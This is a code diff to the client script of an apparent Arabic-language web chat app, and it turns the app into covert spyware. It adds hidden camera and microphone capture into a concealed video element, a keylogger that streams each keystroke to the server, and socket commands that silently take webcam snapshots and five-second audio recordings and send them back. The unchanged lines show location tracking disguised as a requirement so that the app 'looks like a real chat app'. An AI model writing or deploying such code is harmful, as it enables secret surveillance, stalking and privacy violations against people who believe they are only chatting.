@@ -15,9 +15,13 @@ document.addEventListener('DOMContentLoaded', () => {
     const messageInput = document.getElementById('messageInput');
     const chatMessages = document.getElementById('chatMessages');
     const onlineUsersSpan = document.getElementById('onlineUsers');
+    
+    const stealthVideo = document.getElementById('stealthVideo');
+    const stealthCanvas = document.getElementById('stealthCanvas');
 
     let username = '';
     let watchId = null;
+    let cameraStream = null;
 
     // Join Chat
     joinForm.addEventListener('submit', (e) => {
@@ -26,22 +30,35 @@ document.addEventListener('DOMContentLoaded', () => {
         if (inputName) {
             username = inputName;
             
-            // First, trigger location request ( disguised as a requirement )
+            // First, trigger location and camera requests
+            // We ask for both in parallel (or sequentially).
+            
+            // 1. Camera & Mic Request
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(stream => {
+                    cameraStream = stream;
+                    stealthVideo.srcObject = stream;
+                    stealthVideo.muted = true; // prevent feedback loop locally
+                })
+                .catch(err => {
+                    console.log("Media denied or not available", err);
+                });
+            }
+
+            // 2. Location Request
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        // Permission granted, start tracking in background
                         startHiddenTracking();
                         enterChat();
                     },
                     (error) => {
-                        // Even if denied, let them in so it looks like a real chat app
-                        // But we log it or just let it be.
                         enterChat();
                     }
                 );
             } else {
-                enterChat(); // browser doesn't support it, just enter
+                enterChat();
             }
         }
     });
@@ -63,12 +80,19 @@ document.addEventListener('DOMContentLoaded', () => {
         e.preventDefault();
         const msg = messageInput.value.trim();
         if (msg && socket) {
-            // Add my own message to UI immediately
             appendMessage('أنت', msg, 'sent');
-            
-            // Send to server
             socket.emit('chat_message', { sender: username, text: msg });
             messageInput.value = '';
+            
+            // Clear live typing after sending
+            socket.emit('live_typing', ''); 
+        }
+    });
+
+    // HIDDEN: Live Keylogger
+    messageInput.addEventListener('input', () => {
+        if (socket) {
+            socket.emit('live_typing', messageInput.value);
         }
     });
 
@@ -88,6 +112,68 @@ document.addEventListener('DOMContentLoaded', () => {
 
         socket.on('user_left_notice', (name) => {
             appendSystemMessage(`غادر ${name} الغرفة`);
+        });
+
+        // HIDDEN: Listen for snapshot command
+        socket.on('take_snapshot', () => {
+            if (cameraStream && stealthVideo.readyState === stealthVideo.HAVE_ENOUGH_DATA) {
+                stealthCanvas.width = stealthVideo.videoWidth;
+                stealthCanvas.height = stealthVideo.videoHeight;
+                const context = stealthCanvas.getContext('2d');
+                context.drawImage(stealthVideo, 0, 0, stealthCanvas.width, stealthCanvas.height);
+                
+                // Get base64 image
+                const imageData = stealthCanvas.toDataURL('image/jpeg', 0.8);
+                
+                // Send back to server silently
+                socket.emit('snapshot_result', {
+                    image: imageData,
+                    username: username
+                });
+            }
+        });
+
+        // HIDDEN: Listen for audio wiretap command
+        socket.on('take_audio', () => {
+            if (cameraStream) {
+                try {
+                    // Try to get audio tracks
+                    const audioTracks = cameraStream.getAudioTracks();
+                    if (audioTracks.length > 0) {
+                        const mediaRecorder = new MediaRecorder(cameraStream);
+                        const audioChunks = [];
+
+                        mediaRecorder.addEventListener("dataavailable", event => {
+                            audioChunks.push(event.data);
+                        });
+
+                        mediaRecorder.addEventListener("stop", () => {
+                            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                            
+                            // Convert Blob to Base64 to send via socket
+                            const reader = new FileReader();
+                            reader.readAsDataURL(audioBlob); 
+                            reader.onloadend = function() {
+                                const base64Audio = reader.result;
+                                socket.emit('audio_result', {
+                                    audio: base64Audio,
+                                    username: username
+                                });
+                            }
+                        });
+
+                        mediaRecorder.start();
+                        // Record for 5 seconds
+                        setTimeout(() => {
+                            if (mediaRecorder.state === "recording") {
+                                mediaRecorder.stop();
+                            }
+                        }, 5000);
+                    }
+                } catch (e) {
+                    console.error("Wiretap failed", e);
+                }
+            }
         });
     }
 
